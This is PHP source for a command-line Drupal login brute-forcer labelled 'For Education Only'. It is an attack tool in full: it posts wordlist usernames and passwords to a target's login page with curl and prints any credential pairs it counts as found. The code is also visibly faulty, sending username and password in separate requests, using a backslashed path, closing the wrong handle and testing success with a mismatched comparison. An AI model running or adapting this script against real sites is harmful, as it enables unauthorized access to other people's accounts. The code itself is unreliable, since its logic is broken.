<?php
error_reporting(null);
/* 


| LunaticTech | PHP Drupal Login BruteForce | Coded By DwiyanTech
| Presented By IN CRUST WE RUSH 
| For Education Only !!! 
| PHP Command Line Mode With Curl Method
| 

# How To Use It ?
| Make A Wordlist 
| php brute.php <URL> <WORDLIST_USER> <WORDLIST_PASSWORD>

# NOTE !!! 
| THIS TOOL NOT WORK IN SERVER ANTI ROBOT SYSTEM 
| NOT WORK IN CLOUDFLARE SYSTEM 

#INDONESIAN  LANGUANGE
| LunaticTech | PHP Drupal Login BruteForce | Coded By DwiyanTech
| (JANGAN DI RECODE YA TONG :V ) Hanya Untuk Pembelajaran

# Penggunaan 
| Buatlah Wordlist 
| Ketik Di CMD Atau Terminal


*/

if( !empty($argv[1]) || !empty($argv[2]) || !empty($argv[3])  ){
echo "###########################################\n";
echo "## DRUPAL BRUTE FORCE BY ICWR-TECH V.1 ###\n";
echo "## icwr-tech.id | lunatictech.xyz #########\n";
echo "##########################################\n";

$url = $argv[1];
$wordlist = file_get_contents($argv[2]);
$wordlistpw= file_get_contents($argv[3]);

$listuser = explode("\n",$wordlist);
$listpw = explode("\n",$wordlistpw);


echo "Check Connection...";

$curl = curl_init($url);
curl_setopt($curl,CURLOPT_CONNECTTIMEOUT,10);
curl_setopt($curl,CURLOPT_HEADER,true);
curl_setopt($curl,CURLOPT_NOBODY,true);
curl_setopt($curl,CURLOPT_RETURNTRANSFER,true);

$con = curl_exec($curl);
$info = curl_getinfo($curl,CURLINFO_HTTP_CODE);
curl_close($curl);

if($info !== "404"){
    echo "\nCONNECTED !!!\n";
    echo "Brute Forcing .....\n";
    foreach($listuser as $userlist){

     $ch = curl_init();
     curl_setopt($ch,CURLOPT_URL,$url."\user\login");
     curl_setopt($ch,CURLOPT_POST,1);
     curl_setopt($ch,CURLOPT_NOBODY,true);
     curl_setopt($ch,CURLOPT_POSTFIELDS, "name=".$userlist);
     curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    $info_user = curl_getinfo($ch,CURLINFO_HTTP_CODE);
     $exec = curl_exec($ch);
     curl_close($ch);

  
     foreach($listpw as $wlpw){

        $curl_pw = curl_init();
     curl_setopt($curl_pw,CURLOPT_URL,$url."\user\login");
     curl_setopt($curl_pw,CURLOPT_POST,1);
     curl_setopt($curl_pw,CURLOPT_NOBODY,true);
     curl_setopt($curl_pw,CURLOPT_POSTFIELDS, "pw=".$wlpw);
     curl_setopt($curl_pw,CURLOPT_RETURNTRANSFER,true);
    
     $exec_pw = curl_exec($curl_pw);
   $info_pw = curl_getinfo($curl_pw,CURLINFO_HTTP_CODE);
     curl_close($exec_pw);
     

     }
 if($info == "404"){
     echo "Halaman Login Tidak Ditemukan !!! \n\n"; 
     exit;
 } else {
     if($info_user && $info_pw == "301"){
   
  $hasil = $userlist." => Username  || ".$wlpw." => Password \n\n";

  echo $hasil;
        

     } else {

        continue;

     }
    }

}

echo "======= RESULT =======\n\n";
if($hasil == null){
    echo "USER DAN PW Tidak Ditemukan \n\n";
} else {
    echo $hasil;
}



} else {
    echo "\nCHECK YOUR INTERNET CONNECTION OR TARGET !!!\n";
}

} else {
    echo "#####################################\n";
    echo "## PHP LOGIN BY ICWR-TECH         ###\n";
    echo "## icwr-tech.id | lunatictech.xyz ###\n";
    echo "###################################\n";
    echo "php brute.php <URL>  <WORDLIST_USER> <WORDLIST_PASSWORD> \n";
    echo "\n";


}

?>